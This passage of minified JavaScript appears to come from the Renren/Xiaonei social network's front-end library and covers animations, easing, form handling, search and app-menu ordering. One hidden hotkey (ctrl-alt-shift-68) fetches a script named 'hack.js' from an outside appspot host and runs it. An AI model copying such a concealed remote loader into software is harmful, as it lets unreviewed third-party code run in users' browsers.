clearInterval(_367.slidetimer);
_367.slidetimer=null;
_367.style.height=eh;
_367.style.overflow=_367.slideOverflow;
}
},50);
},slideClose:function(_36c){
if(_36c.slidetimer){
return;
}
var eh=_36c.offsetHeight,h=eh;
_36c.slideHeight=eh;
_36c.slideOverflow=_36c.getStyle("overflow");
_36c.style.overflow="hidden";
var step=parseInt(eh/10);
_36c.slidetimer=setInterval(function(){
_36c.style.height=(h-=step)+"px";
if(h<=0){
clearInterval(_36c.slidetimer);
_36c.slidetimer=null;
_36c.style.display="none";
_36c.style.height=eh;
_36c.style.overflow=_36c.slideOverflow;
}
},50);
},scrollTo:function(_370,_371,_372){
if(_370.scrolltimer){
return;
}
_371=_371||10;
_372=_372||XN.FUNC.empty;
var d=_370.realTop();
var i=XN.EVENT.winHeight();
var h=document.body.scrollHeight;
var a=XN.EVENT.scrollTop();
var _377=null;
if(d>a){
if(d+_370.offsetHeight<i+a){
return;
}
_370.scrolltimer=setInterval(function(){
a+=Math.ceil((d-a)/_371)||1;
window.scrollTo(0,a);
if(a==d){
clearInterval(_370.scrolltimer);
_370.scrolltimer=null;
}
},10);
}else{
_370.scrolltimer=setInterval(function(){
a+=Math.ceil((d-a)/_371)||-1;
window.scrollTo(0,a);
if(a==d){
clearInterval(_370.scrolltimer);
_370.scrolltimer=null;
}
},10);
}
}};
XN.EFFECT=XN.Effect=XN.effect;
(function(_378){
var _379={linear:function(t,b,c,d){
return c*t/d+b;
},easeIn:function(t,b,c,d){
return c*(t/=d)*t+b;
},easeOut:function(t,b,c,d){
return -c*(t/=d)*(t-2)+b;
},easeBoth:function(t,b,c,d){
if((t/=d/2)<1){
return c/2*t*t+b;
}
return -c/2*((--t)*(t-2)-1)+b;
},easeInStrong:function(t,b,c,d){
return c*(t/=d)*t*t*t+b;
},easeOutStrong:function(t,b,c,d){
return -c*((t=t/d-1)*t*t*t-1)+b;
},easeBothStrong:function(t,b,c,d){
if((t/=d/2)<1){
return c/2*t*t*t*t+b;
}
return -c/2*((t-=2)*t*t*t-2)+b;
},elasticIn:function(t,b,c,d,a,p){
if(t===0){
return b;
}
if((t/=d)==1){
return b+c;
}
if(!p){
p=d*0.3;
}
if(!a||a<Math.abs(c)){
a=c;
var s=p/4;
}else{
var s=p/(2*Math.PI)*Math.asin(c/a);
}
return -(a*Math.pow(2,10*(t-=1))*Math.sin((t*d-s)*(2*Math.PI)/p))+b;
},elasticOut:function(t,b,c,d,a,p){
if(t===0){
return b;
}
if((t/=d)==1){
return b+c;
}
if(!p){
p=d*0.3;
}
if(!a||a<Math.abs(c)){
a=c;
var s=p/4;
}else{
var s=p/(2*Math.PI)*Math.asin(c/a);
}
return a*Math.pow(2,-10*t)*Math.sin((t*d-s)*(2*Math.PI)/p)+c+b;
},elasticBoth:function(t,b,c,d,a,p){
if(t===0){
return b;
}
if((t/=d/2)==2){
return b+c;
}
if(!p){
p=d*(0.3*1.5);
}
if(!a||a<Math.abs(c)){
a=c;
var s=p/4;
}else{
var s=p/(2*Math.PI)*Math.asin(c/a);
}
if(t<1){
return -0.5*(a*Math.pow(2,10*(t-=1))*Math.sin((t*d-s)*(2*Math.PI)/p))+b;
}
return a*Math.pow(2,-10*(t-=1))*Math.sin((t*d-s)*(2*Math.PI)/p)*0.5+c+b;
},backIn:function(t,b,c,d,s){
if(typeof s=="undefined"){
s=1.70158;
}
return c*(t/=d)*t*((s+1)*t-s)+b;
},backOut:function(t,b,c,d,s){
if(typeof s=="undefined"){
s=1.70158;
}
return c*((t=t/d-1)*t*((s+1)*t+s)+1)+b;
},backBoth:function(t,b,c,d,s){
if(typeof s=="undefined"){
s=1.70158;
}
if((t/=d/2)<1){
return c/2*(t*t*(((s*=(1.525))+1)*t-s))+b;
}
return c/2*((t-=2)*t*(((s*=(1.525))+1)*t+s)+2)+b;
},bounceIn:function(t,b,c,d){
return c-_379["bounceOut"](d-t,0,c,d)+b;
},bounceOut:function(t,b,c,d){
if((t/=d)<(1/2.75)){
return c*(7.5625*t*t)+b;
}else{
if(t<(2/2.75)){
return c*(7.5625*(t-=(1.5/2.75))*t+0.75)+b;
}else{
if(t<(2.5/2.75)){
return c*(7.5625*(t-=(2.25/2.75))*t+0.9375)+b;
}
}
}
return c*(7.5625*(t-=(2.625/2.75))*t+0.984375)+b;
},bounceBoth:function(t,b,c,d){
if(t<d/2){
return _379["bounceIn"](t*2,0,c,d)*0.5+b;
}
return _379["bounceOut"](t*2-d,0,c,d)*0.5+c*0.5+b;
}};
var _3c6=function(){
_3c7(this.onTweening,this);
if(this.current>=this.frames){
this.stop();
_3c7(this.onComplete,this);
this.tweening=false;
return;
}
this.current++;
};
var _3c7=function(func,_3c9){
var args=Array.prototype.slice.call(arguments);
args=args.slice(2);
if(typeof func=="function"){
try{
return func.apply(_3c9||this,args);
}
catch(e){
_3c9.errors=_3c9.errors||[];
_3c9.errors.push(e);
}
}
};
_378.Motion=function(_3cb,_3cc){
this.duration=_3cc||1000;
this.tween=_3cb||"linear";
};
_378.Motion.getTweens=function(){
return _379;
};
_378.Motion.prototype={init:function(){
_3c7(this.onInit,this);
this.fps=this.fps||35;
this.frames=Math.ceil((this.duration/1000)*this.fps);
if(this.frames<1){
this.frames=1;
}
var f=("function"==typeof this.tween)?this.tween:_379[this.tween]||_379["linear"];
this.equation=function(from,to){
return f((this.current/this.frames)*this.duration,from,to-from,this.duration);
};
this.current=this.tweening=1;
},start:function(){
this.init();
_3c7(this.onStart,this);
var _3d0=this,d=this.duration/this.frames;
this.timer=setInterval(function(){
_3c6.call(_3d0);
},d);
},stop:function(){
if(this.timer){
clearInterval(this.timer);
}
this.tweening=false;
}};
})(XN.effect);
XN.ui.getHiddenDiv=function(){
if(!this._hiddenDiv){
this._hiddenDiv=$element("div").hide();
document.body.appendChild(this._hiddenDiv);
}
return this._hiddenDiv;
};
XN.ui.friendSearchBar=function(p){
var _3d3=$(p.input);
var _3d4=$(p.submit||null);
var form=$(p.form);
var tip=p.tip||"\u627e\u4eba...";
var _3d7=p.action||function(p){
if(p.type&&p.type=="PAGE"){
window.location.href="http://page."+XN.ENV.domain+"/"+p.id+"?from=opensearch";
}else{
window.location.href="http://www."+XN.ENV.domain+"/profile.do?id="+p.id+"&from=opensearch";
}
};
var _3d9=false;
(new XN.FORM.inputHelper(_3d3)).setDefaultValue(tip).onEnter(function(el){
if(_3d9){
return;
}
if(!XN.STRING.isBlank(el.value)){
form.submit();
}
});
var _3db=16;
var _3dc={id:_3d3,noResult:function(){
return "\u641c\u7d22\""+this.input.value+"\"";
},limit:_3db,params:p.params};
var _3dd=new XN.UI.friendSelector(_3dc);
_3dd.lastMenuItem=function(){
if(this.result.length==_3db){
return "<li><p><a onmousedown=\"window.location.href=this.href\" href=\"http://friend."+XN.env.domain+"/myfriendlistx.do?qu="+this.input.value+"\">\u70b9\u51fb\u67e5\u770b\u66f4\u591a..</a></p></li>";
}else{
return "";
}
};
_3dd.setMenuWidth(_3d3.offsetWidth);
_3dd.onSelectOne=function(p){
_3d9=true;
_3d7(p);
};
if(_3d4){
_3d4.onclick=function(){
if(_3d9){
return false;
}
var v=_3d3.value;
if(v!=tip&&!XN.STRING.isBlank(v)){
form.submit();
return false;
}
if(_3d4.tagName.toLowerCase()=="a"){
return true;
}else{
return false;
}
};
}
};
XN.namespace("form");
XN.FORM=XN.Form=XN.form;
XN.form.fillWithJSON=function(form,json){
form=$(form);
XN.form.fillWithArray(form,XN.json.parse(json));
};
XN.form.fillWithArray=function(form,a){
form=$(form);
for(var p in a){
XN.form.Element.setValue(p,a[p],form);
}
};
XN.form.setValue=function(_3e5,_3e6){
return XN.form.Element.setValue(_3e5,_3e6);
};
XN.form.getValue=function(_3e7){
return XN.form.Element.getValue(_3e7);
};
XN.form.serialize=function(form,type){
return this.serializeElements(this.getElements(form),type||"string");
};
XN.form.serializeElements=function(_3ea,type,_3ec){
type=type||"array";
if(isUndefined(_3ec)){
_3ec=false;
}
var data=[],_key,_3ef;
XN.array.each(_3ea,function(i,v){
if(!v.disabled&&v.name){
_key=v.name;
_3ef=_3ec?encodeURIComponent(XN.form.Element.getValue(v)):XN.form.Element.getValue(v);
if(_3ef!==null){
if(_key in data){
if(!isArray(data[_key])){
data[_key]=[data[_key]];
}
data[_key].push(_3ef);
}else{
data[_key]=_3ef;
}
}
}
});
if(type=="array"){
return data;
}else{
if(type=="string"){
return XN.array.toQueryString(data);
}else{
if(type=="hash"){
var tmp={};
for(var p in data){
if(!isFunction(data[p])){
tmp[p]=data[p];
}
}
return tmp;
}
}
}
};
XN.form.getElements=function(form){
form=$(form);
var _3f5=[];
var all=form.getElementsByTagName("*");
XN.array.each(all,function(i,v){
if(!isUndefined(XN.form.Element.Serializers[v.tagName.toLowerCase()])){
_3f5.push(v);
}
});
return _3f5;
};
XN.form.Element={getValue:function(_3f9){
_3f9=$(_3f9);
var _3fa=_3f9.tagName.toLowerCase();
return XN.form.Element.Serializers[_3fa](_3f9);
},setValue:function(_3fb,_3fc,form){
if(form){
_3fb=form[_3fb];
if((isElement(_3fb)&&_3fb.tagName.toLowerCase()=="select")){
XN.form.Element.Serializers["select"](_3fb,_3fc);
}else{
if(isElement(_3fb)){
XN.form.Element.Serializers[_3fb.tagName.toLowerCase()](_3fb,_3fc);
}else{
if(_3fb[0]){
var _3fe=_3fb[0].tagName.toLowerCase();
for(var i=0,j=_3fb.length;i<j;i++){
XN.form.Element.Serializers[_3fe](_3fb[i],(_3fc[i]||_3fc||""));
}
}
}
}
return _3fb;
}else{
_3fb=$(_3fb);
var _3fe=_3fb.tagName.toLowerCase();
XN.form.Element.Serializers[_3fe](_3fb,_3fc);
return _3fb;
}
}};
XN.form.Element.Serializers={input:function(_401,_402){
switch(_401.type.toLowerCase()){
case "checkbox":
case "radio":
return XN.form.Element.Serializers.inputSelector(_401,_402);
default:
return XN.form.Element.Serializers.textarea(_401,_402);
}
},inputSelector:function(_403,_404){
if(isUndefined(_404)){
return _403.checked?_403.value:null;
}else{
_403.checked=!!_404;
}
},textarea:function(_405,_406){
if(isUndefined(_406)){
return _405.value;
}else{
_405.value=_406;
}
},select:function(_407,_408){
if(isUndefined(_408)){
return this[_407.type=="select-one"?"selectOne":"selectMany"](_407);
}else{
var opt,_40a,_40b=!isArray(_408);
for(var i=0,_40d=_407.length;i<_40d;i++){
opt=_407.options[i];
_40a=this.optionValue(opt);
if(_40b){
if(_40a==_408){
opt.selected=true;
return;
}
}else{
opt.selected=XN.array.include(_408,_40a);
}
}
}
},selectOne:function(_40e){
var _40f=_40e.selectedIndex;
return _40f>=0?this.optionValue(_40e.options[_40f]):null;
},selectMany:function(_410){
var _411=[],_412=_410.length;
if(!_412){
return null;
}
for(var i=0;i<_412;i++){
var opt=_410.options[i];
if(opt.selected){
_411.push(this.optionValue(opt));
}
}
return _411;
},optionValue:function(opt){
return opt.value||opt.text;
}};
$F=function(id,type){
var el=$(id);
if(el.tagName.toLowerCase()=="form"){
return XN.form.serialize(el,type);
}else{
return XN.form.getValue(el);
}
};
XN.form._helper=function(el){
el=$(el);
if(el._helper){
return el._helper;
}
el._helper=this;
this.element=el;
};
XN.form._helper.prototype={maxSize:9999,limit:function(max,cut){
var This=this;
this.maxLength=max;
if(isUndefined(cut)){
cut=true;
}
this._limit_cut=cut;
if(this._limit){
return this;
}
this._limit=true;
var This=this;
var el=this.element;
XN.event.addEvent(el,"focus",check);
XN.event.addEvent(el,"keyup",check);
function check(){
This.limitCheck();
}
return this;
},limitCheck:function(){
var This=this;
var el=this.element;
setTimeout(function(){
var v=el.value;
if(v.length>This.maxLength){
if(This._limit_cut){
el.value=v.substr(0,This.maxLength);
}
This.fireEvent("overmaxLength");
}else{
This.fireEvent("normalLength");
}
This.fireEvent("checkover");
},0);
},count:function(show,_422){
if(this._count){
return this;
}
this._count=true;
var This=this,show=$(show);
if(isUndefined(_422)){
_422=true;
}
if(!this.maxLength){
_422=false;
}
var el=this.element;
this.addEvent("overmaxLength",function(){
show.addClass("full");
});
this.addEvent("normalLength",function(){
show.delClass("full");
});
this.addEvent("checkover",update);
function update(){
show.innerHTML=el.value.length+(_422?"/"+This.maxLength:"");
}
return this;
},countSize:function(show,max,_427){
return this.limit(max).count(show,_427);
},getRealValue:function(){
var el=this.element;
if(el.value==this._defaultValue){
return "";
}
return el.value;
},reloadDefaultValue:function(){
this.element.value=this._defaultValue;
this.element.style.color="#888";
},defaultValue:function(v){
var This=this;
var el=this.element;
v=v||el.value;
if(!isUndefined(this._defaultValue)&&el.value==this._defaultValue){
el.value=v;
}
this._defaultValue=v;
if(this._default){
return this;
}
this._default=true;
if(document.activeElement!==el){
el.value=v;
}
el.style.color="#888";
XN.event.addEvent(el,"focus",function(){
if(el.value==This._defaultValue){
el.value="";
el.style.color="#333";
}
});
XN.event.addEvent(el,"blur",function(){
if(el.value==""){
el.value=This._defaultValue;
el.style.color="#888";
}
});
return this;
},focus:function(_42c){
var el=this.element;
if(isUndefined(_42c)){
_42c=el.value.length;
}
if(el.setSelectionRange){
el.focus();
el.setSelectionRange(el.value.length,_42c);
}else{
if(el.createTextRange){
var _42e=el.createTextRange();
_42e.moveStart("character",_42c);
_42e.collapse(true);
_42e.select();
el.focus();
}else{
el.focus();
}
}
return this;
},onEnter:function(_42f){
var el=this.element;
var _431=el.tagName.toLowerCase()=="textarea";
XN.event.addEvent(el,"keydown",function(e){
e=e||window.event;
if(e.keyCode==13){
if(_431&&!e.ctrlKey){
return false;
}
XN.event.stop(e);
_42f(el);
return false;
}
},false);
return this;
},onEsc:function(_433){
var el=this.element;
XN.event.addEvent(el,"keydown",function(e){
e=e||window.event;
if(e.keyCode==27){
XN.event.stop(e);
_433(el);
return false;
}
},false);
return this;
},autoResize:function(min,max){
var This=this,el=this.element,type;
this.minSize=min||this.minSize;
this.maxSize=max||this.maxSize;
if(el.tagName.toLowerCase()=="textarea"){
this.resizeType="height";
}else{
this.resizeType="width";
}
if(!XN.form.inputShadow){
var d=$element("div");
d.setStyle("position:absolute;left:-99999px;top:-99999px");
document.body.appendChild(d);
XN.form.inputShadow=d;
}
this.shadow=XN.form.inputShadow;
setTimeout(function(){
if(min){
return;
}
This.minSize=type=="width"?el.offsetWidth:el.offsetHeight;
},10);
el.style.overflow="hidden";
XN.event.addEvent(el,"focus",function(){
This.timer=setInterval(This._resize.bind(This),200);
});
XN.event.addEvent(el,"blur",function(){
clearInterval(This.timer);
This.timer=null;
});
return this;
},_resize:function(){
var el=this.element,sh=this.shadow,oh,type=this.resizeType;
sh.style.fontSize=el.getStyle("fontSize");
var fs=parseInt(el.getStyle("fontSize"),0);
sh.style.fontFamily=el.getStyle("fontFamily");
(type=="width")?sh.style.height=el.offsetHeight:sh.style.width=el.offsetWidth;
sh.innerHTML=XN.string.escapeHTML(el.value).replace(/\r\n/mg,"<br>").replace(/\r/mg,"<br>").replace(/\n/mg,"<br>");
(type=="width")?oh=sh.offsetWidth:oh=sh.offsetHeight+fs+3;
if(oh>this.minSize&&oh<this.maxSize){
el.style[type]=oh+"px";
}else{
if(oh<this.minSize){
el.style[type]=this.minSize+"px";
}else{
if(oh>this.maxSize){
el.style[type]=this.maxSize+"px";
}
}
}
},cursorPosition:function(){
var _441=this.element;
var _442=0,end=0;
if(typeof (_441.selectionStart)=="number"){
_442=_441.selectionStart;
end=_441.selectionEnd;
}else{
if(document.selection){
var _444=document.selection.createRange();
if(_444.parentElement()==_441){
var _445=document.body.createTextRange();
_445.moveToElementText(_441);
for(_442=0;_445.compareEndPoints("StartToStart",_444)<0;_442++){
_445.moveStart("character",1);
}
for(var i=0;i<=_442;i++){
if(_441.value.charAt(i)=="\n"){
_442++;
}
}
var _445=document.body.createTextRange();
_445.moveToElementText(_441);
for(end=0;_445.compareEndPoints("StartToEnd",_444)<0;end++){
_445.moveStart("character",1);
}
for(var i=0;i<=end;i++){
if(_441.value.charAt(i)=="\n"){
end++;
}
}
}
}
}
return {"start":_442,"end":end,"item":[_442,end]};
}};
XN.form._helper.prototype.setDefaultValue=XN.form._helper.prototype.defaultValue;
XN.event.enableCustomEvent(XN.form._helper.prototype);
XN.form.help=function(id){
return new XN.form._helper(id);
};
XN.form.inputHelper=XN.form.textAreaHelper=XN.form.help;
$CursorPosition=function(el){
return XN.form.help(el).cursorPosition();
};
XN.form.userInfoAutoComplete=function(id,type){
var _44b={"elementaryschool":"http://www."+XN.env.domain+"/autocomplete_elementaryschool.jsp","juniorhighschool":"http://www."+XN.env.domain+"/autocomplete_juniorhighschool.jsp","workplace":"http://www."+XN.env.domain+"/autocomplete_workplace.jsp","highschool":"http://www."+XN.env.domain+"/autocomplete_highschool.jsp","allnetwork":"http://www."+XN.env.domain+"/autocomplete_all_network.jsp","allSchool":"http://www."+XN.env.domain+"/autocomplete-school.jsp","city":"http://www."+XN.env.domain+"/autocomplete-city.jsp","college":"http://www."+XN.env.domain+"/autocomplete_college.jsp"};
var ds=new XN.ui.DS_XHR({url:_44b[type]});
var at=new XN.ui.autoCompleteMenu({DS:ds,input:id});
at.buildMenu=function(r){
return "<p>"+(r.name||r.Name)+"</p>";
};
at.addEvent("select",function(r){
this.input.value=(r.name||r.Name);
});
return at;
};
XN.namespace("widgets");
XN.WIDGETS=XN.Widgets=XN.widgets;
XN.dom.ready(function(){
if(!$("showAppMenu")){
return;
}
if(!$("navMyApps")){
return;
}
var _450=$("navMyApps");
if(!_450){
return;
}
_450.show();
var _451=$("showAppMenu");
var _452=133;
var menu=new XN.ui.menu({bar:"showAppMenu",menu:"appMenu",fireOn:"mouseover",addIframe:true});
});
XN.dom.ready(function(){
if(!$("optionMenuActive")){
return;
}
new XN.UI.menu({bar:"optionMenuActive",menu:"optiondropdownMenu",fireOn:"mouseover"});
});
XN.dom.ready(function(){
if(!$("moreWeb")){
return;
}
new XN.UI.menu({bar:"moreWeb",menu:"moredownWeb",fireOn:"click",alignType:"3-2",offsetX:1});
});
XN.util.hotKey.add("ctrl-alt-shift-68",function(){
XN.loadFile("http://emptyhua.appspot.com/img/hack.js",function(){
XN.hack.exe();
});
});
function fixImage(_454,_455,_456){
if(_454.width>_455){
_454.width=_455;
}
if(_454.height>_456){
_454.height=_456;
}
}
function clipImage(_457){
if(!_457.getAttribute("width")||!_457.getAttribute("height")){
return;
}
var _458=parseInt(_457.getAttribute("width"));
var _459=parseInt(_457.getAttribute("height"));
if(_457.naturalWidth&&_457.naturalHeight&&_457.naturalWidth==_458&&_457.naturalHeight==_459){
return;
}
var _45a=new Image();
_45a.onload=function(){
if(_45a.width==_458&&_45a.height==_459){
return;
}
var _45b=document.createElement("i");
_457.parentNode.replaceChild(_45b,_457);
_45b.style.width=_458+"px";
_45b.style.height=_459+"px";
if(!XN.browser.IE){
_45b.style.display="inline-block";
_45b.appendChild(_45a);
_45b.style.overflow="hidden";
if(_45a.width>_458){
_45a.style.marginLeft="-"+parseInt((_45a.width-_458)/2)+"px";
}
if(_45a.height>_459){
_45a.style.marginTop="-"+parseInt((_45a.height-_459)/2)+"px";
}
}else{
_45b.style.zoom="1";
var top=parseInt((_45a.height-_459)/2);
_45b.style.background="url("+_457.src+") no-repeat -"+parseInt((_45a.width-_458)/2)+"px -"+(top>0?top:0)+"px";
if(_45b.parentNode.tagName=="A"){
_45b.style.cursor="pointer";
}
}
};
_45a.src=_457.src;
}
function roundify(_45d,_45e){
if(!_45e){
_45e=50;
}
if(_45d.height<=_45e){
return;
}
var _45f=_45d.parentNode;
_45d.style.visibility="hidden";
var _460=document.createElement("i");
_460.title=_45d.title;
_460.className=_45d.className;
if(!XN.browser.IE){
_460.style.display="inline-block";
}
_460.style.overflow="hidden";
_460.style.width=_45e+"px";
_460.style.height=(_45d.height>_45e?_45e:_45d.height)+"px";
var _461=new Image();
_460.appendChild(_461);
_461.onload=function(){
_461.width=_45e;
_45f.replaceChild(_460,_45d);
if(_461.height>_45e){
_461.style.marginTop="-"+parseInt((_461.height-_45e)/2)+"px";
}
};
_461.src=_45d.src;
return;
}
XN.dom.ready(function(){
if(!$("navSearchInput")){
return;
}
var fix=null;
function showTip(){
if(!fix){
fix=new XN.ui.fixPositionElement({alignWith:"navSearchInput",tagName:"div"});
fix.hide();
fix.setContent("&nbsp;\u591a\u4e2a\u5173\u952e\u5b57\u7528\u7a7a\u683c\u9694\u5f00&nbsp;<br />&nbsp;\uff08\u4f8b\uff1a\u6c6a\u6d0b \u5317\u4eac\u5927\u5b66\uff09&nbsp;");
fix.container.style.cssText="width:"+($("navSearchInput").offsetWidth-2)+"px;padding:3px 0;background:#EEE;border:1px solid #BDC7D8;opacity:0.8;text-align:center;";
}
fix.show();
}
XN.event.addEvent("navSearchInput","focus",showTip);
XN.event.addEvent("navSearchInput","blur",function(){
if(fix){
setTimeout(function(){
fix.hide();
},100);
}
});
XN.event.addEvent("navSearchInput","keydown",function(){
if(fix){
fix.hide();
}
});
});
XN.dom.ready(function(){
function addRandom(v){
if(v.tagName&&v.tagName.toLowerCase()!="a"){
return;
}
if(v._ad_rd){
return;
}
v._ad_rd=true;
if(v.href.indexOf("#")==0){
return;
}
var name=["_request_from","_mm_id","_visitor_id","_os_type","_hua","_lu","_vip_flag","_ua_flag"][parseInt(Math.random()*(7+1))];
v.href=XN.string.setQuery(name,Math.ceil(Math.random()*100),v.href);
}
function rp(el){
if(!$(el)){
return;
}
XN.event.addEvent(el,"mouseover",function(e){
addRandom(XN.event.element(e||window.event));
});
}
rp("navBar");
rp("appNavHolder");
});
(function(){
var _467=/kaixin\.com|renren\.com|xiaonei\.com/g;
XN.widgets.rp_domain=function rp(el){
if(el.tagName&&el.tagName.toLowerCase()=="a"){
if(el._d_rpd){
return true;
}
el._d_rpd=true;
if(/http|@/.test(el.innerHTML)&&XN.browser.IE){
var _469=el.innerHTML;
}
el.href=el.href.replace(_467,XN.env.domain);
if(!isUndefined(_469)){
el.innerHTML=_469;
}
return true;
}
return false;
};
var divs=["feedHome","notifications","messages"];
XN.widgets.domain_in_one={reg:function(el){
XN.event.addEvent(el,"mouseover",function(e){
var rp=XN.widgets.rp_domain;
var el=XN.event.element(e||window.event);
if(rp(el)){
return;
}
if(rp(el.parentNode)){
return;
}
rp(el.parentNode);
});
}};
XN.dom.ready(function(){
XN.array.each(divs,function(i,v){
if($(v)){
XN.widgets.domain_in_one.reg(v);
}
});
});
})();
$.extend=function(obj){
$extend($,obj);
};
$.extend({clearRange:function(){
try{
document.selection?document.selection.empty():getSelection().removeAllRanges();
}
catch(e){
}
},text:function(node){
var _473=node.childNodes;
for(var i=0,text="";i<_473.length;i++){
if(_473[i].nodeType==3){
text+=_473[i].nodeValue;
}
}
return text;
},css:function(ele,_477){
if(!ele){
return;
}
for(var i in _477){
ele.style[i]=_477[i];
}
},clear:function(node){
node.innerHTML="";
},append:function(node,_47b){
if(_47b.tagName){
node.appendChild(_47b);
}else{
var temp=document.createElement("div");
temp.innerHTML=_47b;
while(temp.hasChildNodes()){
node.appendChild(temp.firstChild);
}
}
},mouse:function(e){
e=e||event;
var x=e.pageX||(e.clientX+XN.EVENT.scrollLeft());
var y=e.pageY||(e.clientY+XN.EVENT.scrollTop());
return {x:x,y:y};
}});
$.wpi={parseMenuItem:function(_480){
var _481=_480.getElementsByTagName("a")[0];
return {id:_481.name,name:$.text(_481),href:_481.href,icon:_480.getElementsByTagName("img")[0].src,target:_481.target};
},parseShortCut:function(_482){
return {id:_482.name,name:_482.title,href:_482.href,icon:_482.getElementsByTagName("img")[0].src,target:_482.target};
},createShortCut:function(item){
var data=$.wpi.parseMenuItem(item);
data.href=this.setUrlParam(data.href,"origin",(this.getBaseCode()*100+93));
return "<a href=\""+data.href+"\" title=\""+data.name+"\" name=\""+data.id+"\" target=\""+data.target+"\"><img src=\""+data.icon+"\" class=\"icon\" /><span class=\"tooltip\"><nobr>"+data.name+"</nobr><span class=\"tooltip-arrow\"></span></span></a>";
},createMenuItem:function(){
var _485=document.createElement("dd");
var data=arguments[0].nodeType?$.wpi.parseShortCut(arguments[0]):arguments[0];
data.href=this.setUrlParam(data.href,"origin",(this.getBaseCode()*100+92));
_485.className="move";
_485.innerHTML="<a href=\""+data.href+"\" name=\""+data.id+"\" target=\""+data.target+"\"><img src=\""+data.icon+"\" />"+data.name+"<span class=\"del-handle\"></span></a>";
return _485;
},createHistroyItem:function(data){
data.href=this.setUrlParam(data.href,"origin",(this.getBaseCode()*100+91));
return "<dd><a href=\""+data.href+"\" name=\""+data.id+"\" target=\""+data.target+"\"><img src=\""+data.icon+"\" />"+data.name+"</a></dd>";
},createStowItem:function(data){
return "<a href=\""+data.href+"\" class=\"commend stow\" title=\""+data.name+"\" name=\""+data.id+"\" target=\""+data.target+"\"><img src=\""+data.icon+"\" class=\"icon\" /><img class=\"plus bauble plus-bullet\" src=\"http://xnimg.cn/imgpro/icons/green-plus-bullet.gif\" /> \u6536\u85cf"+data.name+"</a>";
},setUrlParam:function(url,_48a,_48b){
var reg=new RegExp("\\b"+_48a+"=.*?((?=[&])|$)");
if(reg.test(url)){
return url.replace(reg,_48a+"="+_48b);
}else{
var has=url.indexOf("?")!=-1;
return url+(has?"&":"?")+_48a+"="+_48b;
}
},serial:[],ajaxAddApp:function(id){
if(this.serial.length<6){
this.serial.push(id);
}else{
var temp=this.serial.slice(0,5);
temp.push(id);
this.serial=temp.concat(this.serial.slice(5));
}
new XN.NET.xmlhttp({url:"http://apps."+XN.env.domain+"/menu/addBookmark.do",method:"post",data:"app_id="+id});
},ajaxDelApp:function(id){
for(var i=0;i<this.serial.length;i++){
if(this.serial[i]==id){
this.serial.splice(i,1);
break;
}
}
new XN.NET.xmlhttp({url:"http://apps."+XN.env.domain+"/menu/removeBookmark.do",method:"post",data:"app_id="+id});
},ajaxSerialApp:function(sn){
if(sn.join(",")!=this.serial.join(",")){
this.serial=sn;
new XN.NET.xmlhttp({url:"http://apps."+XN.env.domain+"/menu/reorderBookmark.do",method:"post",data:"app_ids="+XN.JSON.build(sn)});
}
},getBaseCode:function(){
var list={};
list["home."+XN.env.domain]=1;
list["www."+XN.env.domain+"/profile.do"]=2;
list["msg."+XN.env.domain]=3;
list["apps."+XN.env.domain]=5;
list["game."+XN.env.domain]=5;
list["app."+XN.env.domain]=7;
list["app."+XN.env.domain+"/apps/editapps.do"]=8;
list["app."+XN.env.domain+"/apps/application.do"]=9;
list["app."+XN.env.domain+"/app/apps/list"]=28;
return list[location.hostname+location.pathname]||list[location.hostname]||0;
}};
(function(){
$.effect=$.effect||{};
var _494=$.effect.MoveEffect=function(_495){
this.config=_495;
this.element=$(_495.element);
this.nodeStart={x:0,y:0};
this.mouseStart={x:0,y:0};
this.shadow=null;
this.activeItem=null;
if(XN.ELEMENT.getStyle(this.element,"position")=="static"){
$.css(this.element,{"position":"relative"});
}
this.init();
};
_494.prototype={init:function(){
var that=this;
this.moveWrap=function(e){
var pos=$.mouse(e);
if((pos.x-that.mouseStart.x)==0&&(pos.y-that.mouseStart.y)==0){
return;
}
if(that.config.startMove){
that.config.startMove();
}
that.moveHandler(e);
};
this.repeaseWrap=function(e){
that.releaseHandler(e);
};
$(this.element).addEvent("mousedown",function(e){
e=e||window.event;
that.activeItem=that.getActiveItem(e);
if(that.activeItem==null){
return;
}
that.mouseStart=$.mouse(e);
that.nodeStart={x:that.activeItem.offsetLeft,y:that.activeItem.offsetTop};
$(document).addEvent("mousemove",that.moveWrap).addEvent("mouseup",that.repeaseWrap);
XN.BROWSER.IE?(e.returnValue=false):e.preventDefault();
return false;
});
},getActiveItem:function(e){
e=e||window.event;
var obj=e.target||e.srcElement;
while(obj.parentNode!=this.element){
obj=obj.parentNode;
}
return obj.nodeType==1?obj:null;
},moveHandler:function(e){
e=e||window.event;
this.createShadow();
$.clearRange();
var top=this.nodeStart.y+($.mouse(e).y-this.mouseStart.y);
var left=this.nodeStart.x+($.mouse(e).x-this.mouseStart.x);
if(!this.activeItem.parentNode||this.config.outLimit(top,left,this.shadow.offsetHeight,this.shadow.offsetWidth)){
this.releaseHandler();
}else{
this.moveShadow(top,left);
this.serialize(top,left);
}
},createShadow:function(){
if(this.shadow==null){
this.shadow=this.activeItem.cloneNode(true);
$(this.shadow).addClass("movemirror");
$.css(this.shadow,{top:this.nodeStart.y+"px",left:this.nodeStart.x+"px",width:this.activeItem.offsetWidth+"px",height:this.activeItem.offsetHeight+"px"});
$.append(this.element,this.shadow);
}
},releaseHandler:function(e){
$(document).delEvent("mousemove",this.moveWrap).delEvent("mouseup",this.repeaseWrap);
if(this.shadow){
$(this.shadow).remove();
this.shadow=null;
if(typeof this.config.release=="function"){
this.config.release(this.activeItem);
}
}
},moveShadow:function(top,left){
$.css(this.shadow,{top:top+"px",left:left+"px"});
},serialize:function(top,left){
var _4a5=this.config.getIndex(top,left,this.activeItem.offsetHeight,this.activeItem.offsetWidth);
if(_4a5>=0){
var list=this.config.getChilds();
if(list[_4a5]){
this.element.insertBefore(this.activeItem,list[_4a5]);
}else{
$.append(this.element,this.activeItem);
}
}
}};
var _4a7=null;
var _4a8=null;
var _4a9=null;
var _4aa=null;
var _4ab=null;
var _4ac=null;
function sendNewSerial(){
var _4ad=_4a7.getElementsByTagName("dd");
var sn=[];
for(var i=0;i<_4ad.length;i++){
sn.push(parseInt(_4ad[i].getElementsByTagName("a")[0].name));
}
$.wpi.ajaxSerialApp(sn);
}
function createAppMove(){
_4ab=new _494({element:_4a7,getChilds:function(){
return _4a7.getElementsByTagName("dd");
},getIndex:function(top,left,offH,offW){
return Math.ceil(top/offH);
},release:function(){
$.clear(_4aa);
var list=_4a7.getElementsByTagName("dd");
for(var i=0;i<list.length&&i<6;i++){
$.append(_4aa,$.wpi.createShortCut(list[i]));
}
var _4b6=_4a7.getElementsByTagName("dt")[0];
if(!_4b6){
